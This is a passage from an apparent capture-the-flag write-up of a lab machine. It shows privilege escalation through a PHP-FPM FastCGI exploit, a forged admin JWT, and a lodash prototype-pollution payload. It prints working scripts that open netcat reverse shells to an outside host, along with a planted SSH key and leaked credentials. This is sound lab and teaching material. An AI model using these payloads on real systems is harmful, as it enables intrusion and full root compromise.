2022-12-04 19:00:53 (4.10 MB/s) - ‘linpeas.sh’ saved [827827/827827]
```

```c
$ python3 -m http.server 80                                                         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
www-data@pollution:/dev/shm$ curl http://10.10.14.16/linpeas.sh | sh
```

```c
╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
<--- SNIP --->
/run/php/php8.1-fpm.sock
  └─(Read Write)
```

`php-fpm` was running as a potential `Privilege Escalation` vector.

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi

```c
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:6379                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

## Privilege Escalation to victor

> https://github.com/hannob/fpmvuln/blob/master/fpmrce

Skeleton Payload:

```c
#!/bin/bash

# script will try to execute PHP code on target host

PAYLOAD="<?php echo 1382+3871;"
FILENAMES="/usr/bin/phar.phar /usr/share/php/PEAR.php"

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    grep -q 5253 $OUTPUT
    [ $? -eq 0 ] && echo "+++ RCE success with $FN on $HOST, output in $OUTPUT"
done
```

```c
$ cat privesc_victor.sh 
#!/bin/bash

# script will try to execute PHP code on target host

PAYLOAD="<?php system(\"rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.16 9002 >/tmp/g\");"
FILENAMES="/var/www/developers/bootstrap.php"

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    grep -q 5253 $OUTPUT
    [ $? -eq 0 ] && echo "+++ RCE success with $FN on $HOST, output in $OUTPUT"
done
```

Now I created the file on the box and executed it.

```c
www-data@pollution:/dev/shm$ vi shell.sh
#!/bin/bash

# script will try to execute PHP code on target host

PAYLOAD="<?php system(\"rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10
.10.14.16 9002 >/tmp/g\");"
FILENAMES="/var/www/developers/bootstrap.php"

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_
file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    grep -q 5253 $OUTPUT
    [ $? -eq 0 ] && echo "+++ RCE success with $FN on $HOST, output in $OUTPUT"
done
~                                                                               
"shell.sh" [New File] 20 lines, 668 bytes written
```

```c
www-data@pollution:/dev/shm$ chmod +x shell.sh
```

```c
www-data@pollution:/dev/shm$ ./shell
```

```c
$ nc -lnvp 9002
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 10.129.105.58.
Ncat: Connection from 10.129.105.58:33274.
/bin/sh: 0: can't access tty; job control turned off
$
```

```c
$ id
uid=1002(victor) gid=1002(victor) groups=1002(victor)
```

```c
$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==' >> /home/victor/.ssh/authorized_keys
```

```c
$ ssh victor@collect.htb
Linux pollution 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
victor@pollution:~$
```

## user.txt

```c
victor@pollution:~$ cat user.txt
8ac231b3068315d5bd6787792167e30f
```

## Enumeration

```c
victor@pollution:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for victor:
```

```c
victor@pollution:~$ ls -la
total 76
drwx------ 16 victor victor 4096 Nov 21 11:34 .
drwxr-xr-x  3 root   root   4096 Nov 21 11:34 ..
lrwxrwxrwx  1 victor victor    9 Nov 21 11:17 .bash_history -> /dev/null
-rw-r--r--  1 victor victor 3526 Mar 27  2022 .bashrc
drwxr-xr-x 12 victor victor 4096 Nov 21 11:50 .cache
drwx------ 11 victor victor 4096 Nov 21 11:34 .config
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Desktop
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Documents
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Downloads
drwx------  2 victor victor 4096 Nov 29 05:29 .gnupg
drwxr-xr-x  3 victor victor 4096 Nov 21 11:34 .local
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Music
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Pictures
drwxr-xr-x  8 victor victor 4096 Nov 21 11:34 pollution_api
-rw-r--r--  1 victor victor  807 Mar 27  2022 .profile
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Public
lrwxrwxrwx  1 root   root      9 Oct 27 18:44 .rediscli_history -> /dev/null
drwx------  2 victor victor 4096 Dec  4 13:36 .ssh
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Templates
-rw-r-----  1 victor victor   33 Dec  3 14:04 user.txt
drwxr-xr-x  2 victor victor 4096 Nov 21 11:34 Videos
```

```c
victor@pollution:~/pollution_api$ ls -la
total 116
drwxr-xr-x  8 victor victor  4096 Nov 21 11:34 .
drwx------ 16 victor victor  4096 Nov 21 11:34 ..
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 controllers
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 functions
-rw-r--r--  1 victor victor   528 Sep  2 13:21 index.js
drwxr-xr-x  5 victor victor  4096 Nov 21 11:34 logs
-rwxr-xr-x  1 victor victor   574 Aug 26 23:34 log.sh
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 models
drwxr-xr-x 97 victor victor  4096 Nov 21 11:34 node_modules
-rw-r--r--  1 victor victor   160 Aug 26 22:02 package.json
-rw-r--r--  1 victor victor 71730 Aug 26 22:02 package-lock.json
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 routes
```

```c
victor@pollution:~/pollution_api$ cat log.sh 
#!/bin/bash

if [ $1 == 'log_message' ]
then

    date=$(date '+%d-%m-%Y-%H:%M:%S');
    echo "New registered message for admins! $date" > /home/victor/pollution_api/logs/messages/log-$date.log

elif [ $1 == 'log_register' ]
then

    date=$(date '+%d-%m-%Y-%H:%M:%S');
    echo "New registered user! $date" > /home/victor/pollution_api/logs/register/log-$date.log

elif [ $1 == 'log_login' ]
then

    date=$(date '+%d-%m-%Y-%H:%M:%S');
    echo "New authenticated user! $date" > /home/victor/pollution_api/logs/login/log-$date.log

else
  
    echo "argument invalid"

fi
```

```c
victor@pollution:~/pollution_api$ find .
<--- SNIP --->
./models
./models/db.js
./models/Message.js
./models/User.js
./index.js
./logs
./logs/messages
./logs/register
./logs/login
./controllers
./controllers/Messages_send.js
./controllers/Messages.js
./routes
./routes/admin.js
./routes/documentation.js
./routes/client.js
./routes/auth.js
./functions
./functions/jwt.js
./log.sh
./package-lock.json
./package.json
```

```c
victor@pollution:~/pollution_api$ cat functions/jwt.js 
const jwt = require('jsonwebtoken');
const SECRET = "JWT_COLLECT_124_SECRET_KEY"

const signtoken = (payload)=>{
    const token = jwt.sign(payload, SECRET, { expiresIn: 3600 });
    return token;
}

const decodejwt = (token)=>{
    return jwt.verify(token, SECRET, (err, decoded)=>{
        if(err) return false;
        return decoded;
    });
}

module.exports = { signtoken, decodejwt};
```

| SECRET |
| --- |
| JWT_COLLECT_124_SECRET_KEY |

```c
victor@pollution:~/pollution_api$ cat controllers/Messages_send.js
const Message = require('../models/Message');
const { decodejwt } = require('../functions/jwt');
const _ = require('lodash');
const { exec } = require('child_process');

const messages_send = async(req,res)=>{
    const token = decodejwt(req.headers['x-access-token'])
    if(req.body.text){

        const message = {
            user_sent: token.user,
            title: "Message for admins",
        };

        _.merge(message, req.body);

        exec('/home/victor/pollution_api/log.sh log_message');

        Message.create({
            text: JSON.stringify(message),
            user_sent: token.user
        });

        return res.json({Status: "Ok"});

    }

    return res.json({Status: "Error", Message: "Parameter text not found"});
}

module.exports = { messages_send };
```

The `API` used `lodash`! These part of the code looked very vulnerable for me.

```c
const _ = require('lodash');
const { exec } = require('child_process');
```

```c
_.merge(message, req.body);
```

It also required an `x-access-token` to send messages to the `admins`.

```c
victor@pollution:~/pollution_api$ cat package.json
{
  "dependencies": {
    "express": "^4.18.1",
    "jsonwebtoken": "^8.5.1",
    "lodash": "^4.17.0",
    "mysql2": "^2.3.3",
    "sequelize": "^6.21.4"
  }
}
```

> https://security.snyk.io/package/npm/lodash/4.17.0

> https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732

```c
Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as __proto__, constructor and prototype. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the Object.prototype are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.
```

> https://security.snyk.io/package/npm/lodash/4.17.4

```c
Affected versions of this package are vulnerable to Prototype Pollution. The functions merge, mergeWith, and defaultsDeep could be tricked into adding or modifying properties of Object.prototype. This is due to an incomplete fix to CVE-2018-3721.
```

## Privilege Escalation to root by using Prototype Pollution

The app was running on port `3000/TCP` on `localhost`. So I had to forward it to my local machine.

```c
$ ssh -L 3000:127.0.0.1:3000 victor@collect.htb
Linux pollution 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Dec  4 14:13:32 2022 from 10.10.14.16
```

The plan was as followed.

- Create new JWT with role as `admin`
- Modify MySQL db entry inside the API database to the role `admin`
- Add application/json as content type in the request
- Send the payload

### Create Json Web Token (JWT)

I created a new `Json Web Token (JWT)` to execute code.

> https://jwt.io

HEADER:ALGORITHM & TOKEN TYPE

```c
{
  "alg": "HS256",
  "typ": "JWT"
}
```

PAYLOAD:DATA

```c
{
  "user": "username",
  "is_auth": true,
  "role": "admin",
  "iat": 1670174888,
  "exp": 1770178488
}
```

VERIFY SIGNATURE

```c
JWT_COLLECT_124_SECRET_KEY
```

JWT:

```c
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcm5hbWUiLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzAxNzQ4ODgsImV4cCI6MTc3MDE3ODQ4OH0.yZr4K2iX7kIcK4_OBO2AwTfs-NHM8bTScmQLiPk-ZnA
```

### Update Database

```c
victor@pollution:~$ mysql -u 'webapp_user' -p'Str0ngP4ssw0rdB*12@1'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 319
Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```c
MariaDB [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+
7 rows in set (0.002 sec)
```

```c
MariaDB [(none)]> USE pollution_api;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```c
Database changed
MariaDB [pollution_api]> SHOW tables;
+-------------------------+
| Tables_in_pollution_api |
+-------------------------+
| messages                |
| users                   |
+-------------------------+
2 rows in set (0.000 sec)
```

```c
MariaDB [pollution_api]> SELECT * FROM users;
+----+----------+----------+------+---------------------+---------------------+
| id | username | password | role | createdAt           | updatedAt           |
+----+----------+----------+------+---------------------+---------------------+
|  1 | foobar   | asdfasdf | user | 2022-12-04 08:01:46 | 2022-12-04 08:01:46 |
|  2 | xxe      | xxe      | user | 2022-12-04 16:53:43 | 2022-12-04 16:53:43 |
+----+----------+----------+------+---------------------+---------------------+
2 rows in set (0.001 sec)
```

```c
MariaDB [pollution_api]> INSERT INTO users VALUES (99, "username", "password", "admin", "2022-01-01 12:00:00", "2022-01-01 12:00:00");
Query OK, 1 row affected (0.002 sec)
```

### Execute Payload

> https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation

Skeleton Payload:

```c
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```

```c
$ curl -X POST http://127.0.0.1:3000/admin/messages/send -H 'Content-Type: application/json' -d "{\"text\":\"foobar\",\"__proto__\":{\"shell\":\"/proc/self/exe\",\"argv0\":\"console.log(require('child_process').execSync('rm /tmp/z;mkfifo /tmp/z;cat /tmp/z|/bin/sh -i 2>&1|nc 10.10.14.16 9003 >/tmp/z').toString())//\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"}}" -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcm5hbWUiLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzAxNzQ4ODgsImV4cCI6MTc3MDE3ODQ4OH0.yZr4K2iX7kIcK4_OBO2AwTfs-NHM8bTScmQLiPk-ZnA'
{"Status":"Ok"}
```

```c
$ nc -lnvp 9003
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9003
Ncat: Listening on 0.0.0.0:9003
Ncat: Connection from 10.129.105.58.
Ncat: Connection from 10.129.105.58:46384.
/bin/sh: 0: can't access tty; job control turned off
#
```

```c
# id
uid=0(root) gid=0(root) groups=0(root)
```

## root.txt

```c
# cat /root/root.txt
2f00be418095707b78011439ad9ef06b
```
